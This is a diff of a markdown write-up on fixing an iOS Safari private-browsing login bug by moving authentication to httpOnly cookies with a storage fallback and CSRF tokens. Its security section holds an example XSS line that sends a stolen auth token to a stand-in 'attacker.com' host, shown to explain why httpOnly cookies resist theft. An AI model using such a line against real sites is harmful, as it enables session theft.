@@ -5,11 +5,13 @@
 **Symptom:** Users get "Access Denied" on iPhone Safari even with correct credentials.
 
 **Root Cause:** Safari iOS blocks `localStorage` in:
+
 - Private Browsing Mode (always)
 - "Prevent Cross-Site Tracking" enabled (default)
 - "Block All Cookies" setting
 
 Previous code had a **hard check** that threw error if `localStorage` failed:
+
 ```typescript
 if (!token || token.length === 0) {
   throw new Error('Token not saved after login'); // ❌ CAUSED ACCESS DENIED
@@ -74,6 +76,7 @@ class SafeStorage {
 ```
 
 **Features:**
+
 - ✅ Try/catch on ALL operations
 - ✅ Automatic availability detection
 - ✅ In-memory fallback (session-scoped)
@@ -82,19 +85,24 @@ class SafeStorage {
 #### 2. Updated ApiClient (`lib/api/client.ts`)
 
 **Before:**
+
 ```typescript
 localStorage.setItem('auth_token', token); // ❌ Crashes in Private Browsing
 ```
 
 **After:**
+
 ```typescript
 const success = safeStorage.setItem('auth_token', token);
 if (!success) {
-  console.warn('localStorage blocked - using memory fallback. Auth via httpOnly cookies will work.');
+  console.warn(
+    'localStorage blocked - using memory fallback. Auth via httpOnly cookies will work.'
+  );
 }
 ```
 
 **Benefits:**
+
 - No crashes
 - User gets informed warning (console only)
 - App continues to work via cookies
@@ -102,6 +110,7 @@ if (!success) {
 #### 3. Updated Login Flow (`app/login/page.tsx`)
 
 **Before:**
+
 ```typescript
 const token = localStorage.getItem('auth_token');
 if (!token) {
@@ -110,6 +119,7 @@ if (!token) {
 ```
 
 **After:**
+
 ```typescript
 // Success = backend returned 200 OK
 setLoginStage('success');
@@ -118,6 +128,7 @@ console.log('Login successful! Auth via httpOnly cookies');
 ```
 
 **Result:**
+
 - Login succeeds if backend returns 200 OK
 - No dependency on localStorage
 - "Access Denied" bug eliminated
@@ -127,6 +138,7 @@ console.log('Login successful! Auth via httpOnly cookies');
 ### XSS Attack Resistance
 
 **localStorage (OLD approach):**
+
 ```javascript
 // Malicious script injected by attacker
 const stolenToken = localStorage.getItem('auth_token');
@@ -134,6 +146,7 @@ fetch('https://attacker.com/steal?token=' + stolenToken); // ❌ Token stolen!
 ```
 
 **HttpOnly Cookies (NEW approach):**
+
 ```javascript
 // Malicious script injected by attacker
 const stolenToken = document.cookie; // ❌ Returns empty! HttpOnly = not accessible!
@@ -143,35 +156,39 @@ fetch('https://attacker.com/steal?token=' + stolenToken); // ✅ Attack fails!
 ### CSRF Protection
 
 Backend sets **dual cookies:**
+
 1. `nz_jwt` (httpOnly) → Token for auth
 2. `nz_csrf_token` (readable) → CSRF protection
 
 Frontend sends **CSRF token in header** for state-changing requests:
+
 ```typescript
 headers['X-CSRF-Token'] = this.getCsrfFromCookie();
 ```
 
 ## 📱 Browser Compatibility
 
-| Browser | Private Mode | Cookies | localStorage | Result |
-|---------|--------------|---------|--------------|---------|
-| Safari iOS | ✅ | ✅ Works | ❌ Blocked | ✅ **LOGIN WORKS** |
-| Safari iOS | Normal | ✅ Works | ✅ Works | ✅ **LOGIN WORKS** |
-| Chrome Android | ✅ | ✅ Works | ❌ Blocked | ✅ **LOGIN WORKS** |
-| Chrome Android | Normal | ✅ Works | ✅ Works | ✅ **LOGIN WORKS** |
-| Firefox Mobile | ✅ | ✅ Works | ❌ Blocked | ✅ **LOGIN WORKS** |
+| Browser        | Private Mode | Cookies  | localStorage | Result             |
+| -------------- | ------------ | -------- | ------------ | ------------------ |
+| Safari iOS     | ✅           | ✅ Works | ❌ Blocked   | ✅ **LOGIN WORKS** |
+| Safari iOS     | Normal       | ✅ Works | ✅ Works     | ✅ **LOGIN WORKS** |
+| Chrome Android | ✅           | ✅ Works | ❌ Blocked   | ✅ **LOGIN WORKS** |
+| Chrome Android | Normal       | ✅ Works | ✅ Works     | ✅ **LOGIN WORKS** |
+| Firefox Mobile | ✅           | ✅ Works | ❌ Blocked   | ✅ **LOGIN WORKS** |
 
 **Conclusion:** 100% compatibility regardless of localStorage availability.
 
 ## 🚀 Testing Scenarios
 
 ### Scenario 1: Normal Browsing
+
 - ✅ localStorage available
 - ✅ Token saved to localStorage
 - ✅ User profile cached
 - ✅ Fast subsequent page loads
 
 ### Scenario 2: Private Browsing (Safari iOS)
+
 - ⚠️ localStorage blocked
 - ✅ Token saved to memory (session only)
 - ✅ User profile in memory
@@ -179,6 +196,7 @@ headers['X-CSRF-Token'] = this.getCsrfFromCookie();
 - ⚠️ Profile reset on tab close (acceptable UX)
 
 ### Scenario 3: Cookies Disabled (Edge Case)
+
 - ❌ Login will fail (backend returns 401)
 - ✅ Clear error message shown
 - ✅ No "Access Denied" false positive
@@ -186,6 +204,7 @@ headers['X-CSRF-Token'] = this.getCsrfFromCookie();
 ## 📊 User Experience
 
 ### Before (BROKEN)
+
 ```
 User: [Enters correct email/PIN on iPhone Safari Private]
 App: "Access Denied" ❌
@@ -193,6 +212,7 @@ User: WTF?! My credentials are correct!
 ```
 
 ### After (FIXED)
+
 ```
 User: [Enters correct email/PIN on iPhone Safari Private]
 App: "Access Granted" ✅
